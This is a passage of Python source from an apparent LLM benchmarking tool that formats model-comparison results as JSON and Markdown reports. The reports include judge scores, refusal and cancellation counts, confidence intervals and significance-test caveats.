    out["run_index"] = r.run_index
    if r.judge_result is not None:
        out["judges"] = [
            {
                "model": j.model,
                "score": j.score,
                "reasoning": j.reasoning,
                "cost_usd": j.cost_usd,
                "latency_ms": j.latency_ms,
                "parse_error": j.parse_error,
                # Always include risk_level; will be None for non-hallucination
                # judging which keeps the schema predictable for downstream tools.
                "risk_level": j.risk_level,
            }
            for j in r.judge_result.judges
        ]
        out["judge_score_avg"] = r.judge_result.average_score
        out["judge_score_std"] = r.judge_result.std_dev
        out["judge_skipped"] = list(r.judge_result.skipped_models)
        out["judge_degraded"] = list(r.judge_result.degraded_models)
        if r.judge_result.aggregated_risk_level is not None:
            out["hallucination_risk"] = r.judge_result.aggregated_risk_level
    if r.assertion_results is not None:
        # Replace the raw config carryover with the executed results.
        passed, total = count_passed(r.assertion_results)
        out["assertions"] = [
            {
                "type": a.type,
                "passed": a.passed,
                "expected": a.expected,
                "actual": a.actual,
                "message": a.message,
                "error": a.error,
                # The TAG, not the message. `assertions.py` documents that
                # `error` is a display string and that matching on its text
                # would make an exit code depend on wording - then dropped the
                # tag here, leaving a consumer no way to tell a refusal from a
                # broken regex per row except by doing exactly that. `null` on
                # the normal path.
                "error_kind": a.error_kind,
            }
            for a in r.assertion_results
        ]
        out["assertions_passed"] = passed
        out["assertions_total"] = total
    return out


# ===== Markdown =====


def significance_temperature_caveat(omitted: list[str]) -> str:
    """The significance half of the temperature caveat: samples not comparable.

    Lives here rather than in cli.py because both the console and the markdown
    report render it, and cli.py already imports from this module. One wording,
    so a reader comparing the two surfaces sees the same warning.
    """
    return (
        f"{', '.join(omitted)} ran at the provider default temperature, which "
        f"you did not choose - the provider rejects the field, so it is omitted. "
        f"The models in this run were therefore not sampled under identical "
        f"conditions, and a significance result across them may reflect that "
        f"difference rather than a difference in model quality."
    )


def refused_arms(significance_results: list) -> list[tuple[str, int]]:
    """Models that declined at least one run, with the count, in table order.

    Read through `getattr` defaults: `tests/test_display_gaps.py` drives the
    renderers with a duck-typed stand-in carrying only the fields the display
    reads, so a direct attribute access would raise there rather than fail a
    meaningful assertion.
    """
    seen: dict[str, int] = {}
    for r in significance_results or []:
        for model, count in (
            (getattr(r, "model_a", None), getattr(r, "n_refused_a", 0)),
            (getattr(r, "model_b", None), getattr(r, "n_refused_b", 0)),
        ):
            if model is not None and count:
                seen[model] = count
    return list(seen.items())


def mcnemar_pairing_caveat(affected: list[tuple[str, int]]) -> str:
    """The decline half of the McNemar caveat, which is NOT the significance one.

    `significance_refusal_caveat` below says a decline stays in the samples that
    test consumes - true there, and the opposite of what happens here. McNemar
    drops every declined run before the 2x2 table is built, so a decline does not
    contaminate the numbers; it removes an observation, and because the test is
    PAIRED it removes that observation from the other model too. Copying the
    significance wording would state something false.

    Returns "" when nothing declined, so the caller can print it unconditionally.
    """
    if not affected:
        return ""
    named = ", ".join(f"{model} ({count} declined)" for model, count in affected)
    return (
        f"{named} did not answer every run, which shrank the paired set. A "
        f"declined run has no answer to judge, so it is dropped before the table "
        f"is built rather than counted as a pass or a fail - and because this "
        f"test is paired, dropping it removes the matching run of every other "
        f"model too. The rates above are computed over the runs that remained; "
        f"read them beside the paired count, which says how many were actually "
        f"compared."
    )


def untestable_pairs_notice(n_untestable: int, n_pairs: int) -> str:
    """Say how many model pairs the correction was NOT applied over.

    Its own line, deliberately. A per-pair column is not available - the console
    renders a matrix at 3-5 models, a single text line at 2 and a top-K list at 6+,
    and none of the three has a per-pair row. Folding it into the refusal caveat
    below would be worse: that block is gated on an arm having declined, so on a run
    with untestable pairs and no declines the number would disappear exactly when it
    is needed.

    Lives here rather than in cli.py so the console and any later report surface
    render one wording, as the two caveats below already do.
    """
    tested = n_pairs - n_untestable
    return (
        f"{n_untestable} of {n_pairs} model pairs could not be tested (too few "
        f"samples), so the multiple-comparison correction is applied over the "
        f"{tested} that {'were' if tested != 1 else 'was'}."
    )


def significance_refusal_caveat(affected: list[tuple[str, int]]) -> str:
    """The refusal half of the significance caveat: one arm is part declines.

    Lives here rather than in cli.py for the same reason as the temperature
    caveat above - both the console and the markdown report render it, and one
    wording means a reader comparing the two surfaces sees the same warning.

    Fires on ANY decline rather than on a fraction, and regardless of whether
    the verdict came out significant. Both narrower rules were measured and
    both miss half the harm: declines can manufacture a verdict (a model that
    answered nothing was ranked significantly faster) and can also erase one (a
    real difference at p=0.0000 fell to p=0.0710 on two slow declines out of
    five). A null result invites no scrutiny, so the erasing case is the one a
    reader is least likely to catch unaided.
    """
    named = ", ".join(f"{model} ({count} declined)" for model, count in affected)
    return (
        f"{named} did not answer every run. A decline is a real, billed round "
        f"trip, so it stays in the latency and cost samples this test consumes "
        f"- that is deliberate and the numbers above are unchanged. But the "
        f"sample is then part declines and part answers, and a verdict computed "
        f"across the two can be created or destroyed by the mix rather than by "
        f"the models. Read this result against the OK/Ref/Fail column before "
        f"acting on it."
    )


def _format_markdown(
    results: list[BatchResult],
    runs: int = 1,
    significance_results: list | None = None,
    stats_by_cell_cis: dict | None = None,
    mcnemar_results: list | None = None,
    methodology: dict | None = None,
    models_without_temperature: list[str] | None = None,
    significance_temperature_mixed: bool = False,
    run_identity: dict | None = None,
) -> str:
    """Render results as Markdown grouped by prompt_id.

    Each prompt gets its own H2 section with a sub-table of
    (model, temperature, TTFT, latency, cost, status) rows; outputs follow
    the table in code-block form for readability.

    When `runs > 1`, a "Per-cell statistical summary" section is appended
    after the per-prompt sections. When `runs == 1`, the output is
    byte-identical to v0.1.0.

    v0.1.3: when CIs / significance / McNemar / methodology are provided,
    extra sections are appended; otherwise output is byte-identical to v0.1.2.
    """
    if not results:
        return (
            f"# Cli Modelarium batch results\n\n"
            f"_Pricing data as of {PRICING_AS_OF}._\n\n"
            f"No results - the batch was empty.\n"
        )

    total_cost = sum(r.cost_usd for r in results if r.error is None)
    failures = sum(1 for r in results if r.error)
    # A refusal carries `error is None`, so it lands in neither term of
    # "N (M failed)" - a six-result report with three declines read "0
    # failed". Named only when it happened, matching the batch summary.
    refusals = sum(1 for r in results if r.error is None and r.refused and not r.cancelled)
    # Same gap, one state later: a cancelled row carries `error is None` and
    # `refused is False`, so it landed in neither term while still counting in
    # `len(results)` - a three-result report with one cancelled read
    # "3 (0 failed)". Named only when it happened, like refusals.
    cancellations = sum(1 for r in results if r.error is None and r.cancelled)
    has_judges = any(r.judge_result is not None for r in results)
    has_assertions = any(r.assertion_results is not None for r in results)
    # Detect hallucination mode from the data: any judge has a risk_level
    # set, which means parse_hallucination_response was used.
    has_hallucination = any(
        r.judge_result is not None and any(j.risk_level for j in r.judge_result.judges)
        for r in results
    )
    judge_cost = sum(
        j.cost_usd for r in results if r.judge_result is not None for j in r.judge_result.judges
    )

    lines: list[str] = [
        "# Cli Modelarium batch results",
        "",
        f"- Version: {__version__}",
        f"- Pricing data as of: {PRICING_AS_OF}",
        # Run identity beside the version and the pricing date - the other two
        # run-level facts this header already carries. A Markdown report is the
        # copy a human circulates, and "which run was this" is the question
        # they ask of it a week later.
        *(
            [f"- Started at: {run_identity['started_at']}"]
            if run_identity and run_identity.get("started_at")
            else []
        ),
        *(
            [f"- Run ID: {run_identity['run_id']}"]
            if run_identity and run_identity.get("run_id")
            else []
        ),
        f"- Total cost: ${total_cost:.6f}",
    ]
    if has_judges:
        lines.append(f"- Judge cost: ${judge_cost:.6f}")
        lines.append(f"- Combined cost: ${total_cost + judge_cost:.6f}")
    if has_assertions:
        totals = count_assertion_totals(r.assertion_results for r in results)
        if totals.pass_rate is not None:
            # The report is uploaded as a CI artifact beside the exit code, so
            # a bare "100.0% pass rate" on a run that exited 1 is the first
            # thing a reader files a bug about. The ratio is unchanged; what
            # follows it is the part of the suite it could not cover.
            line = (
                f"- Assertions: {totals.passed}/{totals.definitive} "
                f"({totals.pass_rate * 100:.1f}% pass rate)"
            )
            if totals.refused:
                line += f", {totals.refused} not evaluated (refused)"
            lines.append(line)
        elif totals.errored:
            # No percentage: 0% would read as "everything failed", which is a
            # different claim from "nothing could be checked".
            lines.append(
                f"- Assertions: {ERROR_MARK} 0/{totals.errored} - every assertion "
                f"errored, nothing was verified"
            )
        else:
            lines.append("- Assertions: none configured - nothing was verified")
    outcome = f"{failures} failed"
    if refusals:
        outcome += f", {refusals} refused"
    if cancellations:
        outcome += f", {cancellations} cancelled"
    lines.append(f"- Results: {len(results)} ({outcome})")
    lines.append("")

    # Group results by prompt_id, preserving submission order.
    grouped: dict[str, list[BatchResult]] = {}
    for r in results:
        grouped.setdefault(r.prompt_id, []).append(r)

    for prompt_id, items in grouped.items():
        first = items[0]
        # Scoped to this group, and counting "no system prompt" as a value.
        sp_indices = md_prompt_indices(items)
        lines.append(f"## {prompt_id}")
        lines.append("")
        lines.append(f"**Prompt:** {_md_escape(first.prompt)}")
        if sp_indices:
            # More than one system prompt in this group, so there is no
            # default to name. The old line printed `items[0].system` and
            # called it "System (default):" - which silently dropped every
            # other prompt in the group, and mislabelled an explicit
            # per-prompt override as the default when batch supplied one.
            #
            # FULL TEXT, not a preview. The nine READMEs promise that every
            # output format "embeds the full prompt, the full system prompt
            # and the full model response"; truncating here would make that
            # false for Markdown, and two prompts sharing a long preamble
            # would render as identical legend entries.
            lines.append("")
            lines.append("**System prompts:**")
            lines.append("")
            for system, index in sp_indices.items():
                lines.append(f"- **SP {index}:** {_md_escape(system)}")
        elif first.system:
            lines.append("")
            lines.append(f"**System (default):** {_md_escape(first.system)}")
        lines.append("")

        header_cols = ["Model", "Provider"]
        align_cols = ["-------", "--------"]
        if sp_indices:
            header_cols.append("SP")
            align_cols.append("---:")
        if runs > 1:
            # Markdown emitted `run_index` on no surface, so two runs of one
            # cell rendered as identical rows with nothing to tell them apart.
            header_cols.append("Run")
            align_cols.append("---:")
        header_cols += [
            "Temp",
            "TTFT (ms)",
            "Latency (ms)",
            "In",
            "Out",
            "Cost",
        ]
        align_cols += [
            "-----:",
            "----------:",
            "-------------:",
            "---:",
            "----:",
            "-----:",
        ]
        if has_judges:
            header_cols.append("Hallucination Risk" if has_hallucination else "Score")
            align_cols.append(":------")
        if has_assertions:
            header_cols.append("Assertions")
            align_cols.append(":---------")
        header_cols.append("Status")
        align_cols.append(":-------")
        lines.append("| " + " | ".join(header_cols) + " |")
        lines.append("|" + "|".join(align_cols) + "|")

        for r in items:
            ttft = f"{r.ttft_ms:.1f}" if r.ttft_ms is not None else "-"
            latency = f"{r.latency_ms:.1f}" if r.latency_ms is not None else "-"
            # A cancelled cell never learned its cost, so it must not print a
            # number that reads as free.
            cost = (
                "unknown" if r.cancelled
                else "Free" if is_local_model(r.model)
                else f"${r.cost_usd:.6f}"
            )
            status = status_word(r.error, r.refused, r.cancelled)
            cells = [
                _md_code(r.model),
                _md_code(r.provider) if r.provider else "-",
            ]
            if sp_indices:
                cells.append(
                    f"SP {sp_indices[r.system]}" if r.system in sp_indices else "-"
                )
            if runs > 1:
                cells.append(str(r.run_index + 1))
            cells += [
                f"{r.temperature:.1f}",
                ttft,
                latency,
                str(r.input_tokens),
                str(r.output_tokens),
                cost,
            ]
            if has_judges:
                if has_hallucination:
                    cells.append(_hallucination_summary_cell(r))
                else:
                    cells.append(_judge_summary_cell(r))
            if has_assertions:
                cells.append(_assertion_summary_cell(r))
            cells.append(status)
            lines.append("| " + " | ".join(cells) + " |")

            # Failed-assertion details below the row, so the user can see
            # WHICH assertion failed without opening the JSON.
            failure_lines = _assertion_failure_lines(r)
            if failure_lines:
                lines.append("")
                lines.extend(failure_lines)
        lines.append("")

        # Per-row outputs in fenced code blocks.
        for r in items:
            # Same discriminators as the table above, or two runs of one cell
            # carry byte-identical headers over different answers.
            tag = f"{r.model} @ {r.temperature:.1f}"
            if sp_indices:
                tag += f" SP {sp_indices[r.system]}" if r.system in sp_indices else " (no SP)"
            if runs > 1:
                tag += f" run {r.run_index + 1}/{runs}"
            # Not a table cell, so a pipe here is harmless and a literal
            # backslash before it would be visible.
            lines.append(f"**{_md_code(tag, in_table=False)}:**")
            lines.append("")
            if r.error:
                # A provider's error message is untrusted text on one line of
                # report markup, and a blockquote does not protect it.
                lines.append(f"> error: {_md_escape(r.error)}")
            else:
                body = r.output if r.output else (
                    "(refused)" if r.refused else "(no output)"
                )
                # The fence is sized to the content: a model output containing a
                # triple backtick closed a 3-backtick fence from the inside, and
                # everything after it was parsed as the report's own markup.
                # There is no escaping inside a fence, so the fence has to grow.
                fence = _md_fence_for(body)
                lines.append(fence)
                lines.append(body)
                lines.append(fence)
            lines.append("")

    if runs > 1:
        lines.append("## Per-cell statistical summary")
        lines.append("")
        # Its rows are keyed by (model, temperature, system) but it printed
        # only model and temperature, so N system prompts produced N rows with
        # nothing to tell them apart. The console version of this same table
        # has had the column since group 3.
        cell_sp = md_prompt_indices(results)
        sp_head = " SP |" if cell_sp else ""
        sp_align = "---:|" if cell_sp else ""
        lines.append(
            f"| Model | Temp |{sp_head} OK/Ref/Fail | Latency mean ± stdev (ms) | CV | "
            "Tokens mean | Cost total | Diversity | Mode |"
        )
        lines.append(f"|-------|-----:|{sp_align}------------:|--------------------------:|---:|"
                     "------------:|-----------:|----------:|------|")
        for cell in _build_stats_by_cell(results):
            latency_cell = "-"
            if cell["latency_mean_ms"] is not None and cell["latency_stdev_ms"] is not None:
                latency_cell = (
                    f"{cell['latency_mean_ms']:.0f} ± {cell['latency_stdev_ms']:.0f}"
                )
            elif cell["latency_mean_ms"] is not None:
                latency_cell = f"{cell['latency_mean_ms']:.0f}"
            cv_cell = f"{cell['latency_cv']:.3f}" if cell["latency_cv"] is not None else "-"
            tokens_cell = (
                f"{cell['output_tokens_mean']:.0f}"
                if cell["output_tokens_mean"] is not None
                else "-"
            )
            if cell["n_succeeded"] == 0:
                mode_cell = "(no output)"
            elif cell["mode_output"] is None:
                mode_cell = "(no mode)"
            else:
                preview = cell["mode_output"].replace("\n", " ").strip()
                if len(preview) > 40:
                    preview = preview[:37] + "..."
                mode_cell = f"{_md_code(preview)} ({cell['mode_count']}x)"
            if cell_sp:
                index = cell_sp.get(cell["system"]) if cell["system"] else None
                sp_cell = f"| SP {index} " if index else "| - "
            else:
                sp_cell = ""
            row = (
                f"| {_md_code(cell['model'])} "
                f"| {cell['temperature']:.1f} "
                f"{sp_cell}"
                f"| {cell['n_succeeded']}/{cell['n_refused']}/{cell['n_failed']} "
                f"| {latency_cell} "
                f"| {cv_cell} "
                f"| {tokens_cell} "
                f"| ${cell['cost_total_usd']:.6f} "
                f"| {cell['output_diversity']:.2f} "
                f"| {mode_cell} |"
            )
            lines.append(row)
        lines.append("")
        lines.append(
            "_Coefficient of variation (CV) < 0.05 indicates stable model behavior._"
        )
        lines.append("")

    # v0.1.3: append CI, significance, McNemar, and methodology sections.
    if stats_by_cell_cis:
        ci_lines = _markdown_ci_section(stats_by_cell_cis)
        if ci_lines:
            lines.extend(ci_lines)

    if significance_results:
        sig_lines = _markdown_significance_section(significance_results)
        if sig_lines:
            lines.extend(sig_lines)

    # The temperature caveat reached the console and the JSON, never the
    # markdown - the one format written to a file and circulated, where the
    # p-value it qualifies is read by someone who did not watch the run.
    if significance_temperature_mixed and models_without_temperature:
        lines.append(
            "> **Temperature not applied:** "
            + significance_temperature_caveat(sorted(models_without_temperature))
        )
        lines.append("")

    if mcnemar_results:
        mc_lines = _markdown_mcnemar_section(mcnemar_results)
        if mc_lines:
            lines.extend(mc_lines)

    if methodology is not None:
        meth_lines = _markdown_methodology_section(methodology)
        if meth_lines:
            lines.extend(meth_lines)

    return "\n".join(lines)


# Decimals per metric for a rendered interval. A single width served all four
# and was wrong at both ends: at .3f a cost interval of fractions of a cent
# printed as "0.000, 0.000" - a zero-width interval on a metric that varies -
# while a latency in milliseconds carried three digits of noise it never
# measured.
CI_DECIMALS: dict[str, int] = {
    "latency_ms": 1,
    "score": 2,
    "output_tokens": 1,
    "cost_usd": 6,
}

# Console labels. The metric keys used in Markdown and JSON already carry their
# unit (`latency_ms`, `cost_usd`); these did not, so a bare "cost" interval left
# the reader to guess dollars against cents.
CI_CONSOLE_LABELS: dict[str, str] = {
    "latency_ms": "latency (ms)",
    "score": "score",
    "output_tokens": "tokens",
    "cost_usd": "cost (USD)",
}

# Fixed render order, shared by the console and Markdown so a reader comparing
# the two surfaces sees the same sequence.
CI_METRIC_ORDER: tuple[str, ...] = ("latency_ms", "score", "output_tokens", "cost_usd")


def format_ci_value(metric_name: str, value: float) -> str:
    """Render one interval bound at the precision its metric deserves."""
    return f"{value:.{CI_DECIMALS.get(metric_name, 3)}f}"


def ci_prompt_indices(keys: Any) -> dict[str, int]:
    """1-based indices for the distinct system prompts among CI cell keys.

    Mirrors `streaming.prompt_index_map`, including its "empty means nothing to
    disambiguate" convention: with zero or one distinct prompt the caller drops
    the column entirely. Indices are assigned in first-seen order, so they match
    the ones the runs table above already printed.
    """
    seen = index_distinct_prompts(
        key[2] if isinstance(key, tuple) and len(key) == 3 else None for key in keys
    )
    return seen if len(seen) > 1 else {}


def md_prompt_indices(results: list[BatchResult]) -> dict[str, int]:
    """`SP N` indices for one Markdown group, or {} when there is nothing to tell apart.

    Same numbering as everywhere else - it calls `index_distinct_prompts` - and
    a DIFFERENT worth-showing rule, which is the whole reason it exists.

    A missing system prompt counts as a distinct value here. A batch group
    holding one row that ran with a system prompt and one that ran without is
    two different things, and the two-or-more-named-prompts rule the console
    uses would score that as one and drop the column, leaving the rows
    indistinguishable. `compare` cannot reach that state - it resolves to
    either `[None]` or a list of real strings - but `batch` can, because each
    prompt carries its own optional `system`.

    Scoped to ONE group. Computed over the whole file and emitted per group, a
    four-prompt batch repeats every system prompt four times, including under a
    prompt that ran with none.
    """
    if len({r.system for r in results}) <= 1:
        return {}
    return index_distinct_prompts(r.system for r in results)


def ci_cell_label(key: Any, prompt_indices: dict[str, int]) -> str:
    """One-line console label for a CI cell.

    A bare string key still renders - a caller that has not been migrated off
    model-keyed CIs gets the model name rather than a crash.
    """
    if not isinstance(key, tuple) or len(key) != 3:
        return str(key)
    model, temperature, system = key
    label = f"{model} @ {temperature:.1f}"
    index = prompt_indices.get(system) if system else None
    if index is not None:
        label += f" SP {index}"
    return label


def _markdown_ci_section(stats_by_cell_cis: dict) -> list[str]:
    """Build the bootstrap CI Markdown section.

    One row per CELL per metric. Model alone no longer identifies a row: the
    same model at two temperatures has two intervals, and they are usually
    different, so Temp (and SP, when more than one system prompt is in play)
    are part of the row's identity.
    """
    if not any(metrics for metrics in stats_by_cell_cis.values()):
        return []
    prompt_indices = ci_prompt_indices(stats_by_cell_cis.keys())
    out = ["## Bootstrap confidence intervals", ""]
    header = ["Model", "Temp"]
    align = ["---", "---:"]
    if prompt_indices:
        header.append("SP")
        align.append("---:")
    header += ["Metric", "Point estimate", "CI low", "CI high", "CI level"]
    align += ["---", "---:", "---:", "---:", "---:"]
    out.append("| " + " | ".join(header) + " |")
    out.append("|" + "|".join(align) + "|")
    for key, metrics in stats_by_cell_cis.items():
        if isinstance(key, tuple) and len(key) == 3:
            model, temperature, system = key
        else:  # a caller still passing model-keyed CIs
            model, temperature, system = str(key), None, None
        for metric_name in CI_METRIC_ORDER:
            ci = metrics.get(metric_name)
            if ci is None:
                continue
            point = ci.get("point_estimate")
            cells = [
                _md_code(model),
                "-" if temperature is None else f"{temperature:.1f}",
            ]
            if prompt_indices:
                index = prompt_indices.get(system) if system else None
                cells.append("-" if index is None else f"SP {index}")
            cells += [
                metric_name,
                "-" if point is None else format_ci_value(metric_name, point),
                format_ci_value(metric_name, ci["ci_low"]),
                format_ci_value(metric_name, ci["ci_high"]),
                f"{int(round(ci['ci_level'] * 100))}%",
            ]
            out.append("| " + " | ".join(cells) + " |")
    out.append("")
    if prompt_indices:
        # The report is read away from the terminal that printed the runs
        # table, so "SP 2" has to be resolvable from the file itself.
        out.append("System prompts:")
        out.append("")
        for prompt, index in prompt_indices.items():
            preview = prompt if len(prompt) <= 60 else prompt[:57] + "..."
            out.append(f"- **SP {index}:** {_md_escape(preview)}")
        out.append("")
    return out


def _markdown_significance_section(significance_results: list) -> list[str]:
    """Build the pairwise significance Markdown section."""
    if not significance_results:
        return []
    first = significance_results[0]
    out = [
        "## Statistical significance tests",
        "",
        f"- Metric: `{first.metric}`",
        f"- Test: `{first.test_used}`",
        f"- Correction: `{first.correction_method}`",
        f"- Threshold: `p < {first.threshold}`",
        "",
        "| Model A | Model B | Mean A | Mean B | p (raw) "
        "| p (corrected) | Cohen's d | Significant |",
        "|---|---|---:|---:|---:|---:|---:|:---:|",
    ]
    affected = refused_arms(significance_results)
    if affected:
        out.insert(len(out) - 3, f"> {significance_refusal_caveat(affected)}")
        out.insert(len(out) - 3, "")
    for r in significance_results:
        p_raw = f"{r.p_value:.4f}" if r.p_value is not None else "-"
        p_corr = (
            f"{r.p_value_corrected:.4f}" if r.p_value_corrected is not None else "-"
        )
        d_str = (
            f"{r.effect_size:.3f} ({r.effect_size_interpretation})"
            if r.effect_size is not None
            else "-"
        )
        sig = "✓" if r.significant_at_threshold else ""
        mean_a = f"{r.mean_a:.4f}" if r.mean_a is not None else "-"
        mean_b = f"{r.mean_b:.4f}" if r.mean_b is not None else "-"
        out.append(
            f"| {_md_code(r.model_a)} | {_md_code(r.model_b)} "
            f"| {mean_a} | {mean_b} "
            f"| {p_raw} | {p_corr} | {d_str} | {sig} |"
        )
    out.append("")
    return out


def _markdown_mcnemar_section(mcnemar_results: list) -> list[str]:
    """Build the McNemar Markdown section."""
    if not mcnemar_results:
        return []
    first = mcnemar_results[0]
    out = [
        "## Binary outcome significance (McNemar)",
        "",
        "- Metric: hallucination pass/fail",
        f"- Correction: `{first.correction_method}`",
        f"- Threshold: `p < {first.threshold}`",
        "",
        "| Model A | Model B | Paired | Pass rate A | Pass rate B | Discordant "
        "| p (corrected) | Method | Significant |",
        "|---|---|---:|---:|---:|---:|---:|:---|:---:|",
    ]
    for r in mcnemar_results:
        p_corr = (
            f"{r.p_value_corrected:.4f}" if r.p_value_corrected is not None else "-"
        )
        # A pair with no paired runs has no rate. It used to render "0%", which
        # is a claim about two models that were never compared.
        rate_a = "-" if r.a_pass_rate is None else f"{r.a_pass_rate:.0%}"
        rate_b = "-" if r.b_pass_rate is None else f"{r.b_pass_rate:.0%}"
        sig = "✓" if r.significant_at_threshold else ""
        out.append(
            f"| {_md_code(r.model_a)} | {_md_code(r.model_b)} "
            f"| {getattr(r, 'n_paired', 0)} "
            f"| {rate_a} | {rate_b} "
            f"| {r.n_discordant} | {p_corr} | {r.method} | {sig} |"
        )
    out.append("")
    return out


def _markdown_methodology_section(methodology: dict) -> list[str]:
    """Build the methodology metadata section."""
    out = ["## Statistical methodology", ""]
    out.append(f"- Tool version: `{methodology.get('tool_version', '?')}`")
    out.append(f"- scipy version: `{methodology.get('scipy_version', '?')}`")
    out.append(f"- Python version: `{methodology.get('python_version', '?')}`")
    out.append(f"- Runs per cell: `{methodology.get('n_runs', '?')}`")
    bs = methodology.get("bootstrap") or {}
    if bs.get("enabled"):
        line = (
            f"- Bootstrap: method=`{bs.get('method')}`, "
            f"resamples=`{bs.get('n_resamples')}`, "
            f"CI level=`{bs.get('ci_level')}`, "
            f"seed=`{bs.get('seed')}`"
        )
        # Otherwise the report advertises a seeded BCa bootstrap in a document
        # that contains no interval section at all - which is what a degenerate
        # or wholly failed cell produces.
        if bs.get("produced_intervals") is False:
            line += " - attempted, no intervals produced"
        out.append(line)
    sig = methodology.get("significance") or {}
    if sig.get("enabled"):
        out.append(
            f"- Significance test: `{sig.get('test')}`, "
            f"correction=`{sig.get('correction')}`, "
            f"threshold=`{sig.get('threshold')}`"
        )
    out.append("")
    return out


def write_markdown(
    results: list[BatchResult],
    output_path: Path,
    runs: int = 1,
    significance_results: list | None = None,
    stats_by_cell_cis: dict | None = None,
    mcnemar_results: list | None = None,
    methodology: dict | None = None,
    models_without_temperature: list[str] | None = None,
    significance_temperature_mixed: bool = False,
    run_identity: dict | None = None,
) -> None:
    """Atomic write of `results` to `output_path` as Markdown."""
    atomic_write_bytes(
        output_path,
        _format_markdown(
            results,
            runs=runs,
            significance_results=significance_results,
            stats_by_cell_cis=stats_by_cell_cis,
            mcnemar_results=mcnemar_results,
            methodology=methodology,
            models_without_temperature=models_without_temperature,
            significance_temperature_mixed=significance_temperature_mixed,
        run_identity=run_identity,
        ).encode("utf-8"),
    )


def render_markdown_to_console(
    results: list[BatchResult],
    console: Console,
    runs: int = 1,
    significance_results: list | None = None,
    stats_by_cell_cis: dict | None = None,
    mcnemar_results: list | None = None,
    methodology: dict | None = None,
    models_without_temperature: list[str] | None = None,
    significance_temperature_mixed: bool = False,
    run_identity: dict | None = None,
) -> None:
    """Render Markdown via Rich for stdout display."""
    console.print(
        Markdown(
            _format_markdown(
                results,
                runs=runs,
                significance_results=significance_results,
                stats_by_cell_cis=stats_by_cell_cis,
                mcnemar_results=mcnemar_results,
                methodology=methodology,
            models_without_temperature=models_without_temperature,
            significance_temperature_mixed=significance_temperature_mixed,
        run_identity=run_identity,
            )
        )
    )


def _assertion_summary_cell(r: BatchResult) -> str:
    """Render the markdown Assertions cell for one row.

    Examples:
        "5/5 ✓"  - all definitive results passed
        "3/5 ✗"  - some failed (caller can see details in the failure list below)
        "-"      - assertions didn't run (e.g., main call failed, or no assertions)
        "⚠ N/M"  - all rows errored (couldn't run, e.g., missing jsonschema)
    """
    if r.assertion_results is None or not r.assertion_results:
        return "-"
    passed, total = count_passed(r.assertion_results)
    if total == 0:
        # All assertions errored out (e.g., jsonschema not installed).
        return f"{ERROR_MARK} 0/{len(r.assertion_results)}"
    mark = PASS_MARK if passed == total else FAIL_MARK
    return f"{passed}/{total} {mark}"


def _assertion_failure_lines(r: BatchResult) -> list[str]:
    """Per-assertion bullets for the row's failures and errors.

    Always shows failing / errored assertions inline. Passing assertions
    are NOT listed here - they're summarized in the row's cell and the
    JSON has the full breakdown for downstream tools.
    """
    if r.assertion_results is None:
        return []
    interesting = [a for a in r.assertion_results if not a.passed]
    if not interesting:
        return []
    out: list[str] = []
    for a in interesting:
        out.append(f"- {_md_assertion_message(a)}")
    return out


def _md_assertion_message(a: AssertionResult) -> str:
    """Markdown twin of `format_assertion_message`, escaped in two halves.

    The halves need different treatment, which is why this exists rather than
    escaping that function's output. The TYPE is an identifier - seven of the
    ten built-in names contain an underscore - so `_md_escape` would render
    `max_length_chars` as `max\\_length\\_chars`; it goes in a code span, where an
    underscore is already literal. The MESSAGE and the ERROR are prose built
    from the user's configured values and from exception text, so they get the
    prose escaper.
    """
    if a.error is not None:
        return f"{ERROR_MARK} {_md_code(a.type, in_table=False)}: {_md_escape(a.error)}"
    mark = PASS_MARK if a.passed else FAIL_MARK
    return f"{mark} {_md_code(a.type, in_table=False)}: {_md_escape(a.message)}"


def _hallucination_summary_cell(r: BatchResult) -> str:
    """Render the markdown Hallucination Risk cell.

    Single judge: "Low (8)".
    Panel: "High [gpt-5.5: High (3), claude: Medium (5)]".
    No data: "-".
    """
    if r.judge_result is None or not r.judge_result.judges:
        return "-"
    successful = [j for j in r.judge_result.judges if j.score is not None and j.risk_level]

    risk = r.judge_result.aggregated_risk_level or "?"

    if not successful:
        # A judge can classify the risk and still return no parsable score.
        # `hallucination_risk` in the JSON needs only the classification, so
        # this cell said "N/A" for a row the JSON called High.
        if r.judge_result.aggregated_risk_level is not None:
            return f"{risk} (no score)"
        return "N/A"

    if len(successful) == 1 and len(r.judge_result.judges) == 1:
        s = successful[0]
        return f"{s.risk_level} ({s.score})"

    breakdown = ", ".join(
        f"{_md_code(j.model.split('/')[-1])}: {j.risk_level or '?'} "
        f"({j.score if j.score is not None else 'X'})"
        for j in r.judge_result.judges
    )
    return f"{risk} [{breakdown}]"


def _judge_summary_cell(r: BatchResult) -> str:
    """Render the markdown Score cell for one row.

    Single judge: "8"
    Panel:        "Avg 7.3 [gpt-5.5: 8, claude: 7]"
    No judge:     "-"  (e.g., main call failed)
    """
    if r.judge_result is None or not r.judge_result.judges:
        if r.judge_result is not None and r.judge_result.skipped_models:
            skipped = ", ".join(_md_code(m) for m in r.judge_result.skipped_models)
            return f"- (skipped self-eval: {skipped})"
        return "-"

    judges = r.judge_result.judges
    # Degraded-judge caveat belongs HERE, in the scored path. The early-return
    # branch above only fires when there are no judges at all, so a degraded
    # judge - which still produces a score - would never reach it.
    degraded = r.judge_result.degraded_models
    suffix = (
        f" (degraded: {', '.join(_md_code(m) for m in degraded)})" if degraded else ""
    )

    successful = [j for j in judges if j.score is not None]
    if not successful:
        return "N/A (judge parse failed)" + suffix

    if len(successful) == 1 and len(judges) == 1:
        return str(successful[0].score) + suffix

    avg = r.judge_result.average_score
    breakdown = ", ".join(
        f"{_md_code(j.model.split('/')[-1])}: {j.score if j.score is not None else 'X'}"
        for j in judges
    )
    base = f"Avg {avg:.1f} [{breakdown}]" if avg is not None else f"[{breakdown}]"
    return base + suffix


def _backtick_run(text: str) -> int:
    """Length of the longest unbroken run of backticks in `text`."""
    longest = current = 0
    for ch in text:
        current = current + 1 if ch == "`" else 0
        longest = max(longest, current)
    return longest


def _md_code(text: str, *, in_table: bool = True) -> str:
    """Render `text` as a code span nothing inside it can break out of.

    For IDENTIFIERS - model ids, assertion type names, judge model names -
    rather than prose. `_md_escape` is wrong for these: it renders
    `max_length_chars` as `max\\_length\\_chars`, and seven of the ten assertion
    type names contain an underscore. Inside a code span an underscore is
    already literal, so nothing has to be added to it.

    The delimiter is one backtick longer than the longest run inside, which is
    what makes it unbreakable: a code span closes on a run of EQUAL length, and
    no run that long exists in the content.

    `|` is escaped anyway when this lands in a table cell. GFM splits a row on
    pipes before it parses inline spans, so a code span does not protect one -
    it has to be backslash-escaped even in here. Outside a table that backslash
    would render literally, hence `in_table`.
    """
    if not text:
        return ""
